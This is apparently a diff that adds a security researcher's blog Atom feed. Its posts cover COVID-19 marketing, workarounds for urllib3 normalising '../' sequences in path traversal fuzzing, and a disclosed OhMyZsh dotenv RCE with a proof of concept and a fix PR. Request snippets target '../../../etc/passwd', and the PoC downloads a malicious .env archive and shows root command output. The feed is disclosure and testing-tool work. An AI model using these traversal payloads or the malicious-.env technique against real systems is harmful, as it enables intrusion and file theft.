@@ -1,0 +1,611 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://mazinahmed.net/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mazinahmed.net/" rel="alternate" type="text/html" /><updated>2020-04-21T15:49:44-05:00</updated><id>https://mazinahmed.net/feed.xml</id><title type="html">Mazin Ahmed</title><subtitle>Cyber Security Specialist / Penetration Tester</subtitle><entry><title type="html">Bad Marketing: COVID-19 and Cyber Security</title><link href="https://mazinahmed.net/thoughts/covid19-and-cybersecurity/" rel="alternate" type="text/html" title="Bad Marketing: COVID-19 and Cyber Security" /><published>2020-04-14T00:00:00-05:00</published><updated>2020-04-14T00:00:00-05:00</updated><id>https://mazinahmed.net/thoughts/covid19-and-cybersecurity</id><content type="html" xml:base="https://mazinahmed.net/thoughts/covid19-and-cybersecurity/">&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/static/930cf461-8dc4-4a43-9f98-3519cdda7004.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cyber Security, as well as many industries, is trying to make use of COVID-19 for marketing purpose. As sad as it sounds, it’s true.&lt;/p&gt;
+
+&lt;p&gt;COVID-19 themed attacks by threat actors are real. However this has never been new to the security world. We have always seen APTs making utilizing global (and local) events and situations to their benefits. Threat Intelligence is the way to understand and protect against these attacks quickly.&lt;/p&gt;
+
+&lt;p&gt;However, this does not mean by any means to take pandemic as a source of marketing.&lt;/p&gt;
+
+&lt;p&gt;What should be required is public sharing of technical threat intelligence reports for related confirmed incidents.&lt;/p&gt;
+
+&lt;p&gt;To conclude, we should never overtake and abuse as a pandemic for solely marketing purposes.&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="thoughts" /><category term="thoughts" /><summary type="html"></summary></entry><entry><title type="html">The Path for Testing Path Traversal Vulnerabilities with Python</title><link href="https://mazinahmed.net/thoughts/testing-for-path-traversal-with-python/" rel="alternate" type="text/html" title="The Path for Testing Path Traversal Vulnerabilities with Python" /><published>2020-04-12T00:00:00-05:00</published><updated>2020-04-12T00:00:00-05:00</updated><id>https://mazinahmed.net/thoughts/testing-for-path-traversal-with-python</id><content type="html" xml:base="https://mazinahmed.net/thoughts/testing-for-path-traversal-with-python/">&lt;hr /&gt;
+
+&lt;p&gt;I have noticed an odd behavior in &lt;code class=&quot;highlighter-rouge&quot;&gt;requests&lt;/code&gt; module in Python, which uses urllib3. I inspected the root cause via regression testing and I found that the root cause of the issue is a change that was introduced in urllib3.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://127.0.0.1/../../../../doing/certain/check&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which should typically send the request to the following path: &lt;code class=&quot;highlighter-rouge&quot;&gt;/../../../doing/certain/check&lt;/code&gt;. Instead, it’s requesting &lt;code class=&quot;highlighter-rouge&quot;&gt;/doing/certain/check&lt;/code&gt; and modifying the specified input.&lt;/p&gt;
+
+&lt;p&gt;The reason is, dot segments escaping, following RFC3986.&lt;/p&gt;
+
+&lt;p&gt;The change to normalize URIs was introduced in this commit[1] to follow RFC3986[2]. The change is based on the “Remove Dot Segments” at the RFC.&lt;/p&gt;
+
+&lt;p&gt;This breaks a lot of security tools that are performing fuzzing for path traversal vulnerabilities in web-applications.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;I have compiled a number of solutions for this issue.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;solutions&quot;&gt;Solutions&lt;/h1&gt;
+
+&lt;h2 id=&quot;option-1-urllibrequest&quot;&gt;Option 1: urllib.request&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;option-2-requestsrequest&quot;&gt;Option 2: requests.Request&lt;/h2&gt;
+
+&lt;p&gt;Credit: &lt;a href=&quot;https://twitter.com/buffaloverflow&quot;&gt;Rich Warren&lt;/a&gt; - [3] and [4].&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://example.com/../../../etc/passwd&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;prep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;option-3-using-urllib3httpconnectionpool&quot;&gt;Option 3: Using urllib3.HTTPConnectionPool&lt;/h2&gt;
+
+&lt;p&gt;Credit: &lt;a href=&quot;https://twitter.com/quentinpradet&quot;&gt;Quentin Pradet&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib3&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPConnectionPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/../../../../doing/certain/check&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;option-4-downgrading-urllib3&quot;&gt;Option 4: Downgrading urllib3&lt;/h2&gt;
+
+&lt;p&gt;It’s possible to use &lt;code class=&quot;highlighter-rouge&quot;&gt;requests&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;urllib3&lt;/code&gt; module to test passing.&lt;/p&gt;
+
+&lt;p&gt;The option for current tools that use requests or urllib3 is to revert to &lt;code class=&quot;highlighter-rouge&quot;&gt;urllib3==1.24.3&lt;/code&gt;. However, this may not be the best option from an engineering perspective.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;final-additions&quot;&gt;Final Additions&lt;/h1&gt;
+
+&lt;p&gt;I started a discussion on Python Urllib3 Issue tracker on Github: &lt;a href=&quot;https://github.com/urllib3/urllib3/issues/1790&quot;&gt;https://github.com/urllib3/urllib3/issues/1790&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I wanted to thank &lt;a href=&quot;https://twitter.com/sethmlarson&quot;&gt;Seth Michael Larson&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/quentinpradet&quot;&gt;Quentin Pradet&lt;/a&gt;, and &lt;a href=&quot;https://github.com/hodbn&quot;&gt;https://github.com/hodbn&lt;/a&gt;, for all their work on urllib3 and with the Python community!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Commit to support the removal of dot-segments: &lt;a href=&quot;https://github.com/urllib3/urllib3/commit/5b047b645f5f93900d5e2fc31230848c25eb1f5f&quot;&gt;https://github.com/urllib3/urllib3/commit/5b047b645f5f93900d5e2fc31230848c25eb1f5f&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;RFC3986 - Section 5.2.4 - Remove Dot Segments: &lt;a href=&quot;http://tools.ietf.org/html/rfc3986#section-5.2.4&quot;&gt;http://tools.ietf.org/html/rfc3986#section-5.2.4&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/issues/13&quot;&gt;https://github.com/trustedsec/cve-2019-19781/issues/13&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&quot;&gt;https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py#L140&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="thoughts" /><category term="web-security" /><category term="automation" /><summary type="html"></summary></entry><entry><title type="html">Hello World: New Space in The Website</title><link href="https://mazinahmed.net/thoughts/hello-world/" rel="alternate" type="text/html" title="Hello World: New Space in The Website" /><published>2020-04-11T00:00:00-05:00</published><updated>2020-04-11T00:00:00-05:00</updated><id>https://mazinahmed.net/thoughts/hello-world</id><content type="html" xml:base="https://mazinahmed.net/thoughts/hello-world/">&lt;hr /&gt;
+
+&lt;p&gt;I always wanted to write relatively short blog posts on my website to discuss security and to express thoughts on different incidents. However, I didn’t want to mix longer researches and articles with shorter posts.&lt;/p&gt;
+
+&lt;p&gt;Therefore, I created a new space on my website to freely talk while having lengthy blog posts in their own space. In this space, I will be writing 1-3-paragraph blog posts for different topics.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Hello World!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Best Regards,
+&lt;br /&gt;
+Mazin&lt;/p&gt;</content><author><name>mazinahmed</name></author><category term="thoughts" /><category term="thoughts" /><summary type="html"></summary></entry><entry><title type="html">OhMyZsh dotenv Remote Code Execution</title><link href="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/" rel="alternate" type="text/html" title="OhMyZsh dotenv Remote Code Execution" /><published>2020-04-08T00:00:00-05:00</published><updated>2020-04-08T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/ohmyzsh-dotenv-rce</id><content type="html" xml:base="https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/">&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/static/91389496-77d3-4dbe-941b-180403841f58.png&quot; alt=&quot;&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;abstract&quot;&gt;Abstract&lt;/h1&gt;
+
+&lt;p&gt;OhMyZsh was vulnerable to an RCE (Remote Code Execution) vulnerability due to arbitrary trusting ENV files at the dotenv plugin. Users who download a malicious repository or a compressed file can have their machines compromised as a result of the vulnerability.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;OhMyZsh&lt;/strong&gt; is a highly popular framework for managing ZSH configuration. It’s an extremely popular project in the open-source community. At the time of writing, it’s ranked in the top 10 Github repositories across all projects.&lt;/p&gt;
+
+&lt;p&gt;I enjoy automating my setup with different configurations to be more productive at work. OhMyZsh helps me automating tasks along with my scripts and dot-files.&lt;/p&gt;
+
+&lt;p&gt;I wanted to automate a specific scenario in my development environment, where I have multiple projects at the same machine, and each project has specific environment variables that need to be loaded before starting development. There is a popular plugin at OhMyZsh that supports this functionality, known as the dotenv plugin.&lt;/p&gt;
+
+&lt;p&gt;According to the documentation:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;[OhMyZsh - dotenv plugin] automatically load your project ENV variables from &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; file when you &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; into project root directory.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Dotenv plugin loads environment variables when the user enters the project directory. It was made public in 2016, and the vulnerability has existed in the plugin for the past 3 years.&lt;/p&gt;
+
+&lt;p&gt;I wanted to review the source-code before running it on my dev machine.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;vulnerable-code&quot;&gt;Vulnerable Code&lt;/h1&gt;
+
+&lt;p&gt;Commit: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/f960e2be6f01abe5f185d668be661b57051322ac&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+source_env&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# test .env syntax&lt;/span&gt;
+    zsh &lt;span class=&quot;nt&quot;&gt;-fn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dotenv: error when sourcing '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' file&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;2
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else
+      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; +a
+    &lt;span class=&quot;k&quot;&gt;fi
+  fi&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+autoload &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; add-zsh-hook
+add-zsh-hook chpwd source_env
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ZSH_DOTENV_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZSH_DOTENV_FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.env
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The method used in the dotenv plugin to set the environment variables makes use of the &lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt; built-in command.&lt;/p&gt;
+
+&lt;p&gt;Although the command is typically seen when loading environment variables, &lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt; &lt;strong&gt;executes the provided input in Shell&lt;/strong&gt; - (within the same existing shell, that’s why the variables are loaded within the session).&lt;/p&gt;
+
+&lt;p&gt;In our case, whenever a user &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; into a project directory, and that directory has a &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; file, the file is passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt;, to load the variables - and &lt;em&gt;potentially more&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;if-the-user-downloads-a-malicious-repository-or-compressed-file-then-working-with-this-material-leads-to-a-remote-code-execution-when-using-ohmyzsh&quot;&gt;If the user downloads a malicious repository or compressed file, then working with this material leads to a remote code execution when using OhMyZsh.&lt;/h3&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h1&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://github.com/mazen160/public/raw/master/Proof-of-Concepts/ohmyzsh-dotenv-rce/dotenv-poc.zip&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip dotenv-poc.zip
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dotenv-poc
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+root:x:0:0:root:/root:/usr/bin/zsh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/static/603bb5cf-1ff1-450c-9328-a56c96facbfd.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;video&quot;&gt;Video&lt;/h3&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/hYkt5wLpzeM&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
+
+&lt;p&gt;I made a PR to fix the vulnerability at &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;ohmyzsh - PR #8606&lt;/a&gt;. The simple fix to the issue is to prompt the user to confirm the issuance of the &lt;code class=&quot;highlighter-rouge&quot;&gt;source&lt;/code&gt; command to the &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; file. It was enhanced and pushed to OhMyZsh master branch now. Users can make sure they’re using an updated version to protect against the vulnerability when using the dotenv plugin.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+
+&lt;p&gt;It was an interesting session that occurred by coincidence when working on setting up a development environment. The outcome of the session resulted in finding a vulnerability in the ohmyzsh project.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pr-httpsgithubcomohmyzshohmyzshpull8606&quot;&gt;PR: &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/pull/8606&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/pull/8606&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;First Release commit (2016): &lt;a href=&quot;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&quot;&gt;https://github.com/ohmyzsh/ohmyzsh/commit/8d35fa0e2f32dab6894ca06bfc333af94be97ec7&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ss64.com/bash/source.html&quot;&gt;https://ss64.com/bash/source.html&lt;/a&gt;&lt;/li&gt;
